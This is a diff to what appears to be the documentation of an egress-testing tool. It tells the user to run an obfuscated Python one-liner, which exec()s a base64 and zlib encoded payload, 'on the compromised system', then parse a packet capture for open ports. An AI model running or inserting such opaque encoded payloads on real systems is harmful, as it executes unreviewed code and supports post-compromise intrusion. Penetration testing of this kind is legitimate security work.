@@ -98,7 +98,7 @@ On the compromised system, run the python one-liner:
 user@client$ python -c 'import base64,sys,zlib;exec(zlib.decompress(base64.b64decode("eJx9U8FO4zAQvfsrLC51RIjSrop2VwxSgXZ3VQoLLXCoKpSmLjUkjhW7ouXr12M7EIS0l2TmZd57M2NHlKqqDdVV/sINESHbazIG+0z4ThgygoJLcgF1Jp84OQchDdmCpySBedbkg9Hjn6vhjKwaYHp9Pn6czm6HgwnRn8CLX7cWC55GlJy8Ab4SXXCuyD2kSff986bm2UrIJzKD9zjJt3XNpZk5gFy2vgTooQVxuS15nRlOXqDXJ89w0P3RS7rH3xPrc0CUzY+O+/1v/QOy4mv6mwkVL/9GPwk19d4+qYQtO4tXEYaJ5mZZ2GGsMks9lFdS8tywQAxgUWnObMx3OVcGdVSmtbMYfrF4dRYaqa9fLRCSK1OxTtKJWy6v/3VZYiUuUaPRuqqpokJSh2ChG1ShzvA9emP3kSPfMJUhbQ/X7CW2sVcQqOA6vmQmq5+4gWVs3xrYcyyiKNEWNdjQFcxYIBkkPTCUo2KNqaayMvQKAWqS50pI5m2v2SZujOcLQu9gxJy5WLO7k42T2MBdq5kL5tF9killt8TmC1s+gLRVozJXMR8smiIR+V4GAGxz1HUKnkR5oblPD6FLaM3NtrYzu/YKpqZYu3PN1aCmiVaFMKwTd9obqlEgHC0t4dz7oWF5mtJMrmh5glfu2BXQXdNWiWUfR0k5iMbgqNNIjBiPAHqe2phQOrE2fJ4uIp/mLu2GtKVJm5FSl1nBSegp9z25eHICeSjHqXK/6kmcH4ZltdvOg0mzuc8WH/AHGqKd2+qtuxoZ2O26k7YhpMgYsx5e7cINnUWnDrxheB/G+GdYInHBP/7yVuw=")))'
 ```
 
-Once the script has finished, go back to your machine and close tcpdump. You can then parse the pcap file to extract the TCP and UDP connected ports:
+Once the script has finished, go back to your machine and close tcpdump. You can then parse the pcap file to extract the TCP and UDP connections that were received. This was tested on a test network that permitted egress on TCP ports 21,80,443,8080 and UDP ports 161,53447 and blocked all others:
 
 ```
 ^C190 packets captured
